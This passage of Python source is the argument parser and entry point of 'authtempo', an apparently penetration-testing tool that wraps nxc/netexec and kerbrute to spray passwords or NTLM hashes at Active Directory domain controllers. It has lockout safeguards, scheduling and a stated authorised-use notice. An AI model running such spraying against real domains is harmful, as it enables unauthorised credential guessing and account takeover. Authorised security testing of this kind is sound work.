        help=advanced_help or "Stop one tool invocation after no output for this long (default: 60 seconds)",
    )
    safety.add_argument(
        "--exact-domain-only",
        dest="no_realm_retry",
        action="store_true",
        help=advanced_help or "Do not try a second Kerberos domain spelling after a pre-auth realm error",
    )
    safety.add_argument(
        "--keep-testing-found",
        dest="include_compromised",
        action="store_true",
        help=advanced_help or "UNSAFE: keep testing a user after valid credentials are found",
    )
    safety.add_argument(
        "--retry-uncertain",
        dest="retry_indeterminate",
        action="store_true",
        help=advanced_help or "UNSAFE: retry attempts whose prior result could not be confirmed",
    )

    advanced_run = parser.add_argument_group("advanced run and display")
    advanced_run.add_argument(
        "--schedule",
        metavar="WINDOW",
        help=advanced_help or "Run only during business-hours, off-hours, or HH:MM-HH:MM",
    )
    display_mode = advanced_run.add_mutually_exclusive_group()
    display_mode.add_argument(
        "--stream",
        dest="no_live",
        action="store_true",
        default=False,
        help=advanced_help or "Use stable line-by-line output (selected automatically inside tmux)",
    )
    display_mode.add_argument(
        "--dashboard",
        dest="live",
        action="store_true",
        default=False,
        help=advanced_help or "Force the cursor-based dashboard, including inside tmux",
    )
    advanced_run.add_argument(
        "--raw-lines",
        metavar="N",
        dest="feed_lines",
        type=int,
        default=10,
        help=advanced_help or "Recent raw-output lines shown in the compact dashboard (default: 10)",
    )
    advanced_run.add_argument("--nxc-path", help=advanced_help or "Use this nxc/netexec executable")
    advanced_run.add_argument("--kerbrute-path", help=advanced_help or "Use this Kerbrute executable")
    advanced_run.add_argument(
        "--skip-target-check",
        dest="no_preflight",
        action="store_true",
        help=advanced_help or "Skip the domain-controller reachability/domain check (not recommended)",
    )
    advanced_run.add_argument(
        "-v",
        "--verbose",
        action="store_true",
        help=advanced_help or "Show masked commands, every domain retry, and every failover hop",
    )

    # Compatibility spellings stay parseable without crowding either help view.
    aliases = parser.add_argument_group("compatibility aliases")
    aliases.add_argument("--engine", dest="tool", choices=["kerbrute", "nxc"], default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--passes-per-batch", dest="passwords_per_round", metavar="N", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--pause-after-lockout-signals", "--lockout-threshold", dest="lockout_threshold", metavar="N", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--max-lockout-signals-per-pass", "--max-lockouts-per-spray", "--lockout-burst", dest="lockout_burst", metavar="N", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--conn-fail-limit", type=int, default=10, help=argparse.SUPPRESS)
    aliases.add_argument("--log-dir", dest="log_dir", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--exclude-unknown-users", "--filter-disabled", dest="filter_disabled", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--export", choices=["none", "json", "csv", "all"], dest="export", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--feed-lines", dest="feed_lines", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    display_mode.add_argument("--no-live", dest="no_live", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    display_mode.add_argument("--live", dest="live", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--engine-skip-batches", "--engine-skip-passes", "--engine-cooldown", metavar="N", dest="engine_cooldown", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--engine-fail-threshold", metavar="N", dest="engine_fail_threshold", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--no-realm-retry", dest="no_realm_retry", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--include-compromised", dest="include_compromised", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--retry-indeterminate", dest="retry_indeterminate", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--engine-timeout", metavar="SECONDS", dest="engine_timeout", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--engine-idle-timeout", metavar="SECONDS", dest="engine_idle_timeout", type=int, default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--probe-demoted", dest="probe_demoted", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)
    aliases.add_argument("--no-preflight", dest="no_preflight", action="store_true", default=argparse.SUPPRESS, help=argparse.SUPPRESS)

    return parser


def main():
    console = Console()
    invoked_program = Path(sys.argv[0]).name or "authtempo.py"
    legacy_entrypoint = invoked_program in {"authcadence", "authcadence.py", "spraygun.py"}

    if legacy_entrypoint:
        if invoked_program in {"authcadence", "authcadence.py"}:
            compatibility_name = invoked_program
            predecessor = "AuthCadence"
        else:
            compatibility_name = "spraygun.py"
            predecessor = "Spraygun"
        console.print(
            f"[!] {compatibility_name} is a compatibility entry point from {predecessor}; "
            "use authtempo or authtempo.py for new runs.",
            style="yellow",
        )

    parser = build_argument_parser(invoked_program)

    args = parser.parse_args()

    # Reject values that otherwise cause infinite loops, empty batches, or
    # nonsensical safety thresholds.
    numeric_constraints = [
        (args.t >= 0, "-t must be at least 0"),
        (args.passwords_per_round >= 1, "--limit must be at least 1"),
        (args.lockout_threshold >= 1, "--review-after-lockouts must be at least 1"),
        (
            args.lockout_burst >= 0,
            "--max-lockouts must be at least 0",
        ),
        (args.conn_fail_limit >= 1, "--conn-fail-limit must be at least 1"),
        (args.feed_lines >= 1, "--raw-lines must be at least 1"),
        (args.engine_cooldown >= 1, "--tool-retry-after must be at least 1"),
        (args.engine_fail_threshold >= 1, "--tool-error-limit must be at least 1"),
        (args.engine_timeout >= 1, "--tool-timeout must be at least 1"),
        (args.engine_idle_timeout >= 1, "--tool-silence-timeout must be at least 1"),
    ]
    for valid, message in numeric_constraints:
        if not valid:
            parser.error(message)

    if args.schedule:
        try:
            SprayWindow(args.schedule)
        except ValueError as exc:
            parser.error(f"invalid --schedule: {exc}")

    # Validate inputs
    if not os.path.isfile(args.u):
        console.print(f"[!] Userfile not found: {args.u}", style="red")
        sys.exit(1)

    if not os.path.isfile(args.p):
        console.print(f"[!] Password/hash file not found: {args.p}", style="red")
        sys.exit(1)

    # Warn about PTH + kerbrute incompatibility
    if args.pth and args.tool == "kerbrute":
        console.print("[!] PTH mode requires --tool nxc (kerbrute cannot do pass-the-hash). Forcing nxc.", style="yellow")
        args.tool = "nxc"

    # Resolve binaries (skip for --dry-run)
    nxc_bin = args.nxc_path or shutil.which("nxc") or shutil.which("netexec") or ""
    kerbrute_bin = args.kerbrute_path or shutil.which("kerbrute") or ""

    if not args.dry_run:
        if args.tool == "nxc" and not nxc_bin:
            console.print("[!] nxc/netexec not found. Install: https://www.netexec.wiki/ or use --dry-run", style="red")
            sys.exit(1)

        if args.tool == "kerbrute" and not kerbrute_bin:
            console.print("[!] kerbrute not found. Install: https://github.com/ropnop/kerbrute or use --dry-run", style="red")
            sys.exit(1)

    # Build Config
    if args.log_dir:
        resolved_log_dir = args.log_dir
    else:
        resolved_log_dir = "./authtempo-dry-run-out" if args.dry_run else "./authtempo-out"

    cfg = Config(
        userfile=args.u,
        passfile=args.p,
        domain=args.d,
        dc_ip=args.dc_ip,
        tool=args.tool,
        protocol=args.protocol,
        time_between_rounds=args.t,
        passwords_per_round=args.passwords_per_round,
        pth_mode=args.pth,
        lockout_threshold=args.lockout_threshold,
        lockout_burst=args.lockout_burst,
        conn_fail_limit=args.conn_fail_limit,
        nxc_path=args.nxc_path,
        kerbrute_path=args.kerbrute_path,
        resume=args.resume,
        start_fresh=args.start_fresh,
        dry_run=args.dry_run,
        no_preflight=args.no_preflight,
        log_dir=resolved_log_dir,
        filter_disabled=args.filter_disabled,
        export=args.export,
        schedule=args.schedule or "",
        timeline=args.timeline,
        feed_lines=args.feed_lines,
        engine_cooldown_rounds=args.engine_cooldown,
        engine_transient_threshold=args.engine_fail_threshold,
        realm_retry=not args.no_realm_retry,
        verbose=args.verbose,
        live_ui=not args.no_live,
        force_live_ui=args.live,
        retry_compromised=args.include_compromised,
        retry_indeterminate=args.retry_indeterminate,
        engine_timeout_seconds=args.engine_timeout,
        engine_idle_timeout_seconds=args.engine_idle_timeout,
        probe_demoted=args.probe_demoted,
        nxc_binary=nxc_bin,
        kerbrute_binary=kerbrute_bin,
    )

    # Derive realm candidates for kerbrute auto-retry
    cfg.realm_candidates = derive_realm_candidates(cfg.domain)

    try:
        cfg.users = read_input_lines(args.u, identities=True, domain=cfg.domain)
        cfg.passwords = read_input_lines(args.p, identities=False)
    except (OSError, UnicodeError, ValueError) as exc:
        parser.error(str(exc))
    cfg.source_users = list(cfg.users)

    if not cfg.users:
        console.print("[!] No users found in userfile", style="red")
        sys.exit(1)

    if not cfg.passwords:
        console.print("[!] No passwords/hashes found in password file", style="red")
        sys.exit(1)

    console.print(f"[*] {PRODUCT_NAME} — {PRODUCT_TAGLINE}", style="dim")
    console.print("[*] For authorized penetration testing only", style="dim")
    console.print(f"[*] Loaded {len(cfg.users)} users, {len(cfg.passwords)} secrets", style="cyan")

    # Show realm candidates if using kerbrute
    if cfg.tool == "kerbrute" or (cfg.tool == "nxc" and cfg.protocol == "smb"):  # SMB also uses Kerberos
        console.print(f"[*] Kerbrute realm candidates: {' → '.join(cfg.realm_candidates)}", style="cyan")

    # Run
    try:
        completed = run(cfg, console)
        if not completed:
            sys.exit(2)
    except (RuntimeError, ValueError) as e:
        console.print(f"[!] Refusing to run: {e}", style="red")
        sys.exit(1)
    except Exception as e:
        console.print(f"[!] Unexpected fatal error: {e}", style="red")
        if args.verbose:
            import traceback
            console.print(traceback.format_exc(), style="dim")
        else:
            console.print("    Re-run with --verbose for a traceback.", style="dim")
        sys.exit(1)

if __name__ == "__main__":
    main()
